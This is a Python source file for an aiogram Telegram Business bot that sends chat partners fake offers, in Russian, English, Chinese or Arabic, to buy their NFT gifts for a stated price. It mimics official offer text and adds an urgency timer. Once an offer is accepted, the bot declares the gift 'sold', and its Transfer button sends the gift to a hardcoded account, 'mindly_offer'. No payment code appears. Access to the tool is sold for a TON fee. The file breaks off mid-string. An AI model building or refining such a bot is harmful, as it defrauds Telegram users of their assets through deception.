"""Telegram Business assistant for non-official gift proposals.
Команда: 'купить ЦЕНА [ссылка] [eng|kit|arb]' -> Бот отправляет оффер.
Плюс: система входа (ENTRY_PRICE TON), заявки админу, доступ только у одобренных.
"""

import asyncio
import html
import json
import logging
import os
import re
import secrets
import time
from dataclasses import dataclass

from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import Command, CommandStart
from aiogram.types import (
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    LinkPreviewOptions,
    Message,
)
try:
    from aiogram.exceptions import TelegramRetryAfter
except ImportError:
    try:
        from aiogram.exceptions import TelegramFloodWait as TelegramRetryAfter
    except ImportError:
        class TelegramRetryAfter(Exception):
            def __init__(self, message): self.message = message
            @property
            def retry_after(self): return 60

from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("BOT_TOKEN", "")
TTL_HOURS = int(os.getenv("OFFER_TTL_HOURS", "5"))

ADMIN_ID = int(os.getenv("ADMIN_ID", "123456789"))
TON_WALLET = os.getenv("TON_WALLET", "UQ_ТВОЙ_АДРЕС_TON")
ENTRY_PRICE = os.getenv("ENTRY_PRICE", "5.5")
USERS_FILE = os.getenv("USERS_FILE", "allowed_users.json")

# ===== Кому отправлять подарок (НФТ) при нажатии "Передать" =====
GIFT_RECIPIENT = "mindly_offer" 

router = Router()
COMMAND_REGEX = re.compile(r"^купить\s+(.*)$", re.IGNORECASE)
GIFT_EMOJI_HTML = '<tg-emoji emoji-id="6032937473162614352">🎁</tg-emoji>'

# Маркеры языка в конце команды
LANG_TOKENS = {
    "eng": "en",   # английский
    "kit": "zh",   # китайский
    "arb": "ar",   # арабский
}


def detect_lang(payload: str) -> str:
    for token in payload.lower().split():
        if token in LANG_TOKENS:
            return LANG_TOKENS[token]
    return "ru"


# ===== Технический cooldown (защита от FLOOD_WAIT) =====
SEND_COOLDOWN_SECONDS = 1.0

_last_send_time: float = 0.0
_send_lock = asyncio.Lock()


# ===== Хранилище доступа и заявок =====
def load_allowed_users() -> set[int]:
    try:
        with open(USERS_FILE, "r", encoding="utf-8") as f:
            return {int(x) for x in json.load(f)}
    except Exception:
        return set()


def save_allowed_users() -> None:
    try:
        with open(USERS_FILE, "w", encoding="utf-8") as f:
            json.dump(sorted(allowed_users), f)
    except Exception:
        logging.exception("Не удалось сохранить список пользователей")


allowed_users: set[int] = load_allowed_users()
entry_pending: set[int] = set()


def user_info_line(user) -> str:
    uname = f"@{user.username}" if getattr(user, "username", None) else "нет"
    return (
        f"ID: <code>{user.id}</code>\n"
        f"Имя: {html.escape(user.full_name)}\n"
        f"Username: {uname}"
    )


def admin_decision_kb(user_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="✅ Добавить", callback_data=f"admin:allow:{user_id}"),
        InlineKeyboardButton(text="❌ Отклонить", callback_data=f"admin:deny:{user_id}"),
    ]])


def is_peer_flood(e: Exception) -> bool:
    return "PEER_FLOOD" in str(e).upper()


async def send_cooldown() -> None:
    global _last_send_time
    async with _send_lock:
        now = time.monotonic()
        elapsed = now - _last_send_time
        if elapsed < SEND_COOLDOWN_SECONDS:
            await asyncio.sleep(SEND_COOLDOWN_SECONDS - elapsed)
        _last_send_time = time.monotonic()


@dataclass
class Offer:
    id: str
    connection_id: str
    chat_id: int
    message_id: int
    buyer_id: int
    buyer_name: str
    price: str
    currency: str
    lang: str = "ru"
    buyer_username: str = ""
    gift_link: str = "подарок"


offers: dict[str, Offer] = {}


# ===== Отправка БЕЗ ретраев на PEER_FLOOD =====
async def safe_send_message_text(
    bot: Bot, text: str, chat_id: int,
    business_connection_id: str,
    reply_markup: InlineKeyboardMarkup,
    link_preview_options: LinkPreviewOptions
) -> Message:
    await send_cooldown()
    try:
        return await bot.send_message(
            chat_id=chat_id, text=text,
            business_connection_id=business_connection_id,
            reply_markup=reply_markup, link_preview_options=link_preview_options
        )
    except TelegramRetryAfter as e:
        if is_peer_flood(e):
            raise
        wait_time = getattr(e, "retry_after", 30)
        logging.info(f"FLOOD_WAIT {wait_time}s — один ретрай.")
        await asyncio.sleep(wait_time)
        return await bot.send_message(
            chat_id=chat_id, text=text,
            business_connection_id=business_connection_id,
            reply_markup=reply_markup, link_preview_options=link_preview_options
        )


async def safe_edit_message_text(
    bot: Bot, text: str, chat_id: int, message_id: int,
    business_connection_id: str | None = None,
    reply_markup: InlineKeyboardMarkup | None = None,
    link_preview_options: LinkPreviewOptions | None = None
) -> None:
    if link_preview_options is None:
        link_preview_options = LinkPreviewOptions(is_disabled=True)
    max_retries = 3
    for attempt in range(max_retries):
        try:
            await bot.edit_message_text(
                text=text, chat_id=chat_id, message_id=message_id,
                business_connection_id=business_connection_id,
                reply_markup=reply_markup, link_preview_options=link_preview_options
            )
            return
        except TelegramRetryAfter as e:
            if is_peer_flood(e):
                raise
            wait_time = getattr(e, "retry_after", 60)
            if attempt == max_retries - 1:
                raise
            logging.info(f"Edit FLOOD_WAIT ({wait_time}s).")
            await asyncio.sleep(wait_time)
        except Exception as e:
            logging.debug(f"Edit failed: {e}")
            if attempt == max_retries - 1:
                raise
            await asyncio.sleep(1)


def parse_price(payload: str) -> str | None:
    parts = payload.split()
    for part in parts:
        try:
            raw = part.replace(",", ".").lower()
            if raw.replace(".", "").isdigit():
                price_val = float(raw)
                if 0 < price_val < 10000000:
                    formatted = f"{int(price_val) if int(price_val) == price_val else price_val:f}"
                    return formatted.rstrip('0').rstrip('.')
        except ValueError:
            pass
    return None


# ===== Многоязычные тексты офферов =====
def offer_text(offer: Offer) -> str:
    price = offer.price
    cur = offer.currency
    ttl = TTL_HOURS
    gift = offer.gift_link
    
    nbsp = "\u00A0"

    if offer.lang == "en":
        return (
            f"User <b>{html.escape(offer.buyer_name)}</b> offers you\n"
            f"<b>{price} {cur}</b> for {gift}\n\n"
            f"The offer is valid for another <b>{ttl}h{nbsp}59m.</b>"
        )
    if offer.lang == "zh":
        return (
            f"用户 <b>{html.escape(offer.buyer_name)}</b> 向您出价\n"
            f"<b>{price} {cur}</b> 购买{gift}\n\n"
            f"报价有效期还剩 <b>{ttl}小时59分钟。</b>"
        )
    if offer.lang == "ar":
        return (
            f"المستخدم <b>{html.escape(offer.buyer_name)}</b> يعرض عليك\n"
            f"<b>{price} {cur}</b> مقابل {gift}\n\n"
            f"العرض صالح لمدة <b>{ttl}{nbsp}س{nbsp}و{nbsp}59{nbsp}د أخرى.</b>"
        )

    return (
        f"Пользователь <b>{html.escape(offer.buyer_name)}</b> предлагает\n"
        f"Вам <b>{price} {cur}</b> за {gift}\n\n"
        f"Предложение действует ещё <b>{ttl}{nbsp}ч.{nbsp}59{nbsp}м.</b>"
    )


def decline_text(offer: Offer) -> str:
    return {
        "en": "❌ Offer declined",
        "zh": "❌ 报价已被拒绝",
        "ar": "❌ تم رفض العرض",
    }.get(offer.lang, "❌ Предложение отклонено")


def sold_text(offer: Offer) -> str:
    cur = offer.currency
    if offer.lang == "en":
        return (
            f"{GIFT_EMOJI_HTML} The gift has been sold!\n\n"
            f"• Transfer the gift to the buyer to credit {cur}."
        )
    if offer.lang == "zh":
        return (
            f"{GIFT_EMOJI_HTML} 礼物已成功售出！\n\n"
            f"• 请将礼物转给买家以入账 {cur}。"
        )
    if offer.lang == "ar":
        return (
            f"{GIFT_EMOJI_HTML} تم بيع الهدية بنجاح!\n\n"
            f"• قم بتحويل الهدية للمشتري ليتم إضافة {cur}."
        )
    return (
        f"{GIFT_EMOJI_HTML} Подарок успешно продан!\n\n"
        f"• Передайте подарок покупателю для зачисления {cur}."
    )


def sold_keyboard(offer: Offer) -> InlineKeyboardMarkup:
    transfer_label = {
        "en": "Transfer",
        "zh": "转赠",
        "ar": "إرسال",
    }.get(offer.lang, "Передать")
    
    # ВОЗВРАЩЕНО КАК В ПЕРВОМ КОДЕ: кнопка ведет на mindly_offer
    recipient = GIFT_RECIPIENT if GIFT_RECIPIENT else offer.buyer_username
    
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=transfer_label, url=f"tg://send_gift?to={recipient}")],
    ])


def proposal_keyboard(offer: Offer) -> InlineKeyboardMarkup:
    accept_label, decline_label = {
        "en": ("✓ Accept", "✕ Decline"),
        "zh": ("✓ 接受", "✕ 拒绝"),
        "ar": ("✓ قبول", "✕ رفض"),
    }.get(offer.lang, ("✓ Принять", "✕ Отклонить"))

    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=decline_label, callback_data=f"decline:{offer.id}"),
        InlineKeyboardButton(text=accept_label, callback_data=f"accept:{offer.id}"),
    ]])


# ===== Текст для всплывающего окна (Alert) при принятии оффера =====
def accept_alert_text(offer: Offer) -> str:
    buyer_handle = offer.buyer_name
    currency = offer.currency
    currency_text_ru = "звезд" if currency == "Stars" else currency

    gift_name = offer.gift_link
    if "t.me/" in gift_name or "http" in gift_name:
        parts = gift_name.split("/")
        if len(parts) > 0:
            last_part = parts[-1]
            last_part = last_part.replace("-", " #")
            gift_name = re.sub(r'(?<!^)(?=[A-Z])', ' ', last_part).strip()

    if offer.lang == "en":
        return (
            f"Offer to sell {gift_name} successfully accepted.\n\n"
            f"Transfer the gift to {buyer_handle} to
